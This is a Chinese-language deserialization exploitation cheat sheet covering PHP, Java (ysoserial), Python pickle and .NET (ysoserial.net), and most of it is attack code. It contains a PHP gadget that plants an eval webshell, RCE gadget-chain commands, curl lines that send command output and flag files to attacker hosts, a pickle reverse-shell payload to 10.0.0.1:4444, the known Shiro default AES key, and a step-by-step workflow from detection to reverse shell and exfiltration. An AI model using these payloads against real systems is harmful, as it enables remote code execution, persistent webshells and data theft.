# 反序列化漏洞实战参考

> 分类: PHP → Java → Python → .NET → ysoserial → 利用链 → 检测

---

## 1. PHP 反序列化

### 1.1 检测方法

```php
# 特征: 可控的 unserialize()
$data = unserialize($_GET['data']);
$data = unserialize($_COOKIE['user']);

# 序列化格式识别:
# O:4:"User":2:{s:4:"name";s:5:"admin";s:2:"id";i:1;}
# O = 对象, s = 字符串, i = 整数, a = 数组, b = 布尔

# 检测: 提交 O:1:"X":0:{} → 如果报错/行为异常 → 反序列化点
```

### 1.2 魔法方法利用链

```php
# 关键魔法方法:
__destruct()      # 对象销毁时 → 最常用
__wakeup()        # unserialize() 时首先调用
__sleep()         # serialize() 时调用
__toString()      # 对象当字符串用时
__call()          # 调用不存在的方法时
__get() / __set() # 访问不存在的属性时
__construct()     # NEW!!! unserialize 不调, 但 gadget chain 可能用到

# 绕过 __wakeup() (PHP < 5.6.25, < 7.0.10):
# 修改属性数量大于实际数量
O:4:"User":3:{s:4:"name";s:5:"admin";}  # 实际2个属性, 写3→绕过wakeup
```

### 1.3 常用 Gadget Chain

```php
# === 1. 写文件 / 写Webshell ===
class Logger {
    public $logfile = "/var/www/html/shell.php";
    public $logdata = '<?php @eval($_POST[1]);?>';
    function __destruct() {
        file_put_contents($this->logfile, $this->logdata, FILE_APPEND);
    }
}
# 序列化:
# O:6:"Logger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"logdata";s:28:"<?php @eval($_POST[1]);?>";}

# === 2. 命令执行 ===
class Cmd {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
```

### 1.4 PHPGGC (Gadget Chain 生成器)

```bash
# 列出所有可利用的框架+链
phpggc -l

# Laravel RCE
phpggc Laravel/RCE1 system id

# ThinkPHP RCE
phpggc ThinkPHP/RCE1 system id

# WordPress
phpggc WordPress/Dompdf system id

# Monolog
phpggc Monolog/RCE1 system 'curl http://attacker.com/$(cat /flag|base64)'
```

---

## 2. Java 反序列化

### 2.1 检测方法

```bash
# Java 序列化特征:
# - 二进制流, 以 AC ED 00 05 开头 (Java serialization magic bytes)
# - Content-Type: application/x-java-serialized-object
# - 参数名: data / object / payload / ser

# 检测:
# 1. Burp 抓包 → 看 Content-Type
# 2. 响应包中搜 "java.io.IOException"等反序列化错误
# 3. base64 解码后看前4字节 == AC ED 00 05

# URLDNS (无伤检测, 不需要gadget)
java -jar ysoserial.jar URLDNS http://your-dnslog.com | base64
# → 发给目标 → DNSLog收到 → 反序列化点确认
```

### 2.2 常用利用链 — ysoserial 速查

```bash
# ysoserial: https://github.com/frohoff/ysoserial

# === CommonsCollections (最常用) ===
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/$(whoami)'
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'

# === CommonsBeanutils (无需 CommonsCollections) ===
java -jar ysoserial.jar CommonsBeanutils1 'id'

# === Spring ===
java -jar ysoserial.jar Spring1 'id'

# === JDK7u21 ===
java -jar ysoserial.jar Jdk7u21 'id'

# === 无 Commons 依赖时用 ===
java -jar ysoserial.jar BeanShell1 'id'

# === 输出 + Base64 编码 ===
java -jar ysoserial.jar CommonsCollections5 'cmd' | base64 -w0
```

### 2.3 常用目标

```
WebLogic (T3/IIOP协议)
  → ysoserial CommonsCollections + T3协议发送

JBoss (HTTP Invoker / JMXInvokerServlet)
  → /invoker/JMXInvokerServlet → POST 序列化payload

Jenkins
  → /jenkins/cli → CLI协议反序列化

Shiro (RememberMe Cookie)
  → AES密钥已知 (kPH+bIxk5D2deZiIxcaaaA==) → 加密ysoserial → Cookie

Fastjson / Jackson
  → JSON反序列化 → autoType + JNDI注入
```

---

## 3. Python Pickle 反序列化

### 3.1 检测

```python
# Pickle 特征:
# - 二进制/Base64, 以 80 04 95 (protocol 4) 或 80 03 (protocol 3) 开头
# - cPickle/pickle.loads()

# 简单 Payload:
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### 3.2 利用

```python
import pickle
import base64

# 反弹 Shell
class RCE:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
        return (__import__('os').system, (cmd,))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

---

## 4. .NET 反序列化

### 4.1 ysoserial.net

```powershell
# 生成 ViewState payload
ysoserial.exe -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" -o base64

# TypeConfuseDelegate + ActivitySurrogateSelector
ysoserial.exe -g ActivitySurrogateSelectorFromFile -f SoapFormatter -c "exploit.cs"

# 常见入口:
# __VIEWSTATE (ASP.NET ViewState)
# .NET Remoting
# WCF BinaryFormatter
```

---

## 5. 实战利用流程

```
Step 1: 确定语言/框架 + 检测反序列化点
  → Java: AC ED 00 05
  → PHP:  O:X: 格式
  → Python: pickle 协议头 80 03/04/05

Step 2: 确定类路径 (Gadget Chain)
  → Java: ysoserial URLDNS 探测
  → PHP: 代码审计 / 报错回显类名 / phpggc
  → Python: 通常可控 pickle 即 RCE

Step 3: 构造 Payload
  → Java: ysoserial 生成 → Burp 发送
  → PHP: 手写 gadget chain / phpggc
  → .NET: ysoserial.net

Step 4: 回连 / 外带
  → 反弹Shell
  → curl/wget 外带命令结果
  → DNS 外带 (不出网时)
```

---

*参考: ysoserial + PHPGGC + PortSwigger Deserialization + 实战*
